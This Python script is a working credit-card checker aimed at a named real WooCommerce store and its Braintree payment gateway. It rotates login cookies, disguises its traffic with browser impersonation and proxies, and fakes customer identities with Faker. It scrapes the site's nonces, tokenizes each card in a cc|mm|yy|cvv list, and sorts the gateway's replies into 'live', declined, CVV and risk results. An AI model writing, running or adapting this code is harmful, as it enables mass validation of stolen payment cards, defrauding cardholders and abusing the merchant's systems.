import re
import json
import base64
import random
import time
import uuid
from faker import Faker
from curl_cffi.requests import AsyncSession

fake = Faker("en_US")

class CookieManager:
    def __init__(self, cookie_key='wordpress_logged_in_184ab9c7515005851ad068819184e10d'):
        self.cookie_key = cookie_key

    def load_cookies(self):
        try:
            with open('ali.json', "r", encoding="utf-8") as f_coo:
                return json.load(f_coo)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}

    def save_cookies(self, cookies_data):
        with open('b4.json', "w", encoding="utf-8") as f_coo:
            json.dump(cookies_data, f_coo, indent=4, ensure_ascii=False)

    def get_cookies(self):
        cookies_data = self.load_cookies()
        if not cookies_data:
            print("تحذير: لا يوجد كوكيز في الملف!")
            return None

        oldest_cookie_key, oldest_data = min(
            cookies_data.items(),
            key=lambda item: item[1].get("time_B11HB", 0)
        )

        current_time = time.time()
        last_used = oldest_data.get("time_B11HB", 0)
        elapsed_time = current_time - last_used

        if elapsed_time < 13:
            wait_time = 13 - elapsed_time
            time.sleep(wait_time)
            current_time = time.time()

        oldest_data["time_B11HB"] = current_time
        self.save_cookies(cookies_data)

        return {self.cookie_key: oldest_cookie_key}

cookie_manager = CookieManager()

class tools:
    @staticmethod
    def getcard(card: str) -> dict:
        parts = card.split("|")
        cc = parts[0].strip() if len(parts) > 0 else ""
        mm = parts[1].strip() if len(parts) > 1 else ""
        yy = parts[2].strip() if len(parts) > 2 else ""
        cvv = parts[3].strip() if len(parts) > 3 else ""
        
        mm = mm.zfill(2)
        
        if len(yy) == 4:
            yy = yy[-2:]
        elif len(yy) == 2:
            yy = yy
            
        return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}


    @staticmethod
    def find_between(s: str, first: str, last: str) -> str | None:
        try:
            return s.split(first, 1)[1].split(last, 1)[0]
        except (IndexError, AttributeError):
            return None

    @staticmethod
    def userdata() -> dict:
        fn = fake.first_name()
        ln = fake.last_name()
        return {
            "name": f"{fn} {ln}",
            "first": fn,
            "last": ln,
            "address": fake.street_address(),
            "city": fake.city(),
            "state": fake.state_abbr(),
            "zip": fake.postcode(),
            "email": f"{fn.lower()}.{ln.lower()}@gmail.com",
            "phone": fake.phone_number(),
        }

    @staticmethod
    def get_card_type(cc_first: str) -> str:
        if not cc_first:
            return "visa"
        return {"3": "american-express", "5": "master-card", "6": "discover"}.get(cc_first[0], "visa")

RESPONSE_MAP = {
    "payment method successfully added.": ("Success", "Payment method successfully added. ✅", True),
    "transaction approved": ("Success", "Transaction Approved ✅", True),
    "nice! new payment method added": ("Success", "Nice! New payment method added ✅", True),
    "do not honor": ("Declined", "Do Not Honor ❌", False),
    "limit exceeded": ("Declined", "Limit Exceeded ❌", False),
    "cardholder's activity limit exceeded": ("Declined", "Cardholder's Activity Limit Exceeded ❌", False),
    "invalid credit card number": ("Declined", "Invalid Credit Card Number ❌", False),
    "no account": ("Declined", "No Account ❌", False),
    "card account length error": ("Declined", "Card Account Length Error ❌", False),
    "no such issuer": ("Declined", "No Such Issuer ❌", False),
    "voice authorization required": ("Declined", "Voice Authorization Required ❌", False),
    "processor declined possible lost card": ("Declined", "Processor Declined Possible Lost Card ❌", False),
    "processor declined - possible stolen card": ("Declined", "Processor Declined - Possible Stolen Card ❌", False),
    "processor declined - fraud suspected": ("Declined", "Processor Declined - Fraud Suspected ❌", False),
    "transaction not allowed": ("Declined", "Transaction Not Allowed ❌", False),
    "cardholder stopped billing": ("Declined", "Cardholder Stopped Billing ❌", False),
    "cardholder stopped all billing": ("Declined", "Cardholder Stopped All Billing ❌", False),
    "invalid transaction": ("Declined", "Invalid Transaction ❌", False),
    "violation": ("Declined", "Violation ❌", False),
    "declined - updated cardholder available": ("Declined", "Declined - Updated Cardholder Available ❌", False),
    "processor does not support this feature": ("Declined", "Processor Does Not Support This Feature ❌", False),
    "card type not enabled": ("Declined", "Card Type Not Enabled ❌", False),
    "set up error - merchant": ("Declined", "Set Up Error - Merchant ❌", False),
    "invalid merchant id": ("Declined", "Invalid Merchant ID ❌", False),
    "set up error - card": ("Declined", "Set Up Error - Card ❌", False),
    "set up error - hierarchy": ("Declined", "Set Up Error - Hierarchy ❌", False),
    "set up error - terminal": ("Declined", "Set Up Error - Terminal ❌", False),
    "encryption error": ("Declined", "Encryption Error ❌", False),
    "surcharge not permitted": ("Declined", "Surcharge Not Permitted ❌", False),
    "processor declined": ("Declined", "Processor Declined ❌", False),
    "invalid authorization code": ("Declined", "Invalid Authorization Code ❌", False),
    "declined - call for approval": ("Declined", "Declined - Call For Approval ❌", False),
    "error - do not retry, call issuer": ("Declined", "Error - Do Not Retry, Call Issuer ❌", False),
    "declined - call issuer": ("Declined", "Declined - Call Issuer ❌", False),
    "invalid merchant number": ("Declined", "Invalid Merchant Number ❌", False),
    "call issuer. pick up card": ("Declined", "Call Issuer. Pick Up Card ❌", False),
    "declined": ("Declined", "Declined ❌", False),
    "closed card": ("Declined", "Closed Card ❌", False),
    "card not activated": ("Declined", "Card Not Activated ❌", False),
    "expired card": ("Declined", "Expired Card ❌", False),
    "credit card number must be 12-19 digits.": ("Declined", "Credit card number must be 12-19 digits. ❌", False),
    "cannot authorize at this time (life cycle)": ("Declined", "Cannot Authorize at this time (Life cycle) ❌", False),
    "cannot authorize at this time (policy)": ("Declined", "Cannot Authorize at this time (Policy) ❌", False),
    "security violation": ("CCN", "Security Violation ⚠️", False),
    "declined cvv": ("CCN", "Declined CVV ⚠️", False),
    "invalid postal code and cvv": ("CCN", "Invalid postal code and cvv ⚠️", False),
    "card issuer declined cvv": ("CCN", "Card Issuer Declined CVV ⚠️", False),
    "gateway rejected: risk_threshold": ("RISK", "Gateway Rejected: risk_threshold ⚠️", False),
    "risk: retry this bin later.": ("RISK", "RISK: Retry this BIN later. ⚠️", False),
}

class Gateway:
    @staticmethod
    async def charge_card(card_data: dict, user_data: dict, proxies: dict = None) -> tuple[str, str, bool]:
        current_cookie = cookie_manager.get_cookies()
        async with AsyncSession(impersonate="chrome110", proxies=proxies) as session:
            if current_cookie:
                session.cookies.update(current_cookie)

            try:
                headers_get = {
                    "referer": "https://www.dnalasering.com/my-account/payment-methods/",
                }
                resp_get = await session.get(
                    "https://www.dnalasering.com/my-account/add-payment-method/",
                    headers=headers_get,
                )
                html = resp_get.text
                non = tools.find_between(html, 'id="woocommerce-add-payment-method-nonce" value="', '"')
                if not non:
                    return "Error", "Could not extract add-payment-method-nonce", False

                nonce_match = re.search(r'"client_token_nonce"\s*:\s*"([a-zA-Z0-9]+)"', html)
                if not nonce_match:
                    return "Error", "Could not extract client_token_nonce", False
                nonce = nonce_match.group(1)

                headers_ajax = {
                    "origin": "https://www.dnalasering.com",
                    "referer": "https://www.dnalasering.com/my-account/add-payment-method/",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "x-requested-with": "XMLHttpRequest",
                }
                data_ajax = {
                    "action": "wc_braintree_credit_card_get_client_token",
                    "nonce": nonce,
                }
                resp_ajax = await session.post(
                    "https://www.dnalasering.com/wp-admin/admin-ajax.php",
                    headers=headers_ajax,
                    data=data_ajax,
                )
                ajax_json = resp_ajax.json()
                enc = ajax_json.get("data")
                if not enc:
                    return "Error", "AJAX response missing data", False

                dec = base64.b64decode(enc).decode("utf-8")
                au_match = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
                if not au_match:
                    return "Error", "Could not extract authorizationFingerprint", False
                au = au_match.group(1)

                headers_tokenize = {
                    "authorization": f"Bearer {au}",
                    "origin": "https://assets.braintreegateway.com",
                    "referer": "https://assets.braintreegateway.com/",
                    "content-type": "application/json",
                }
                json_tokenize = {
                    "clientSdkMetadata": {
                        "source": "client",
                        "integration": "custom",
                    },
                    "query": (
                        "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {"
                        "  tokenizeCreditCard(input: $input) {"
                        "    token"
                        "    creditCard {"
                        "      bin"
                        "      brandCode"
                        "      last4"
                        "      cardholderName"
                        "      expirationMonth"
                        "      expirationYear"
                        "      binData {"
                        "        prepaid"
                        "        healthcare"
                        "        debit"
                        "        durbinRegulated"
                        "        commercial"
                        "        payroll"
                        "        issuingBank"
                        "        countryOfIssuance"
                        "        productId"
                        "        business"
                        "        consumer"
                        "        purchase"
                        "        corporate"
                        "      }"
                        "    }"
                        "  }"
                        "}"
                    ),
                    "variables": {
                        "input": {
                            "creditCard": {
                                "number": card_data["cc"],
                                "expirationMonth": card_data["mm"],
                                "expirationYear": card_data["yy"],
                                "cvv": card_data["cvv"],
                            },
                            "options": {"validate": False},
                        }
                    },
                    "operationName": "TokenizeCreditCard",
                }
                resp_tokenize = await session.post(
                    "https://payments.braintree-api.com/graphql",
                    headers=headers_tokenize,
                    json=json_tokenize,
                )
                tokenize_json = resp_tokenize.json()
                if "data" not in tokenize_json or "tokenizeCreditCard" not in tokenize_json["data"]:
                    return "Error", "Tokenization failed", False
                tok = tokenize_json["data"]["tokenizeCreditCard"]["token"]

                card_type = tools.get_card_type(card_data["cc"])

                headers_final = {
                    "origin": "https://www.dnalasering.com",
                    "referer": "https://www.dnalasering.com/my-account/add-payment-method/",
                    "content-type": "application/x-www-form-urlencoded",
                }
                data_final = [
                    ("payment_method", "braintree_credit_card"),
                    ("wc-braintree-credit-card-card-type", card_type),
                    ("wc-braintree-credit-card-3d-secure-enabled", ""),
                    ("wc-braintree-credit-card-3d-secure-verified", ""),
                    ("wc-braintree-credit-card-3d-secure-order-total", "512.09"),
                    ("wc_braintree_credit_card_payment_nonce", tok),
                    ("wc-braintree-credit-card-tokenize-payment-method", "true"),
                    ("wc_braintree_paypal_payment_nonce", ""),
                    ("wc-braintree-paypal-context", "shortcode"),
                    ("wc_braintree_paypal_amount", "512.09"),
                    ("wc_braintree_paypal_currency", "USD"),
                    ("wc_braintree_paypal_locale", "en_us"),
                    ("wc-braintree-paypal-tokenize-payment-method", "true"),
                    ("woocommerce-add-payment-method-nonce", non),
                    ("_wp_http_referer", "/my-account/add-payment-method/"),
                    ("woocommerce_add_payment_method", "1"),
                ]
                resp_final = await session.post(
                    "https://www.dnalasering.com/my-account/add-payment-method/",
                    headers=headers_final,
                    data=data_final,
                )
                response_text = resp_final.text.lower()

                for key, (status, msg, is_live) in RESPONSE_MAP.items():
                    if key in response_text:
                        return status, msg, is_live

                return "Unknown", "Unrecognised response ❓", False

            except Exception as e:
                return "Error", f"Exception: {str(e)}", False


async def process_B3_4(card_line: str, proxy_url: str = None) -> tuple[str, str, bool]:
    card_data = tools.getcard(card_line)
    if not card_data["cc"]:
        return "Failed", "Invalid card format", False

    user_data = tools.userdata()
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None

    return await Gateway.charge_card(
        card_data=card_data,
        user_data=user_data,
        proxies=proxies,
    )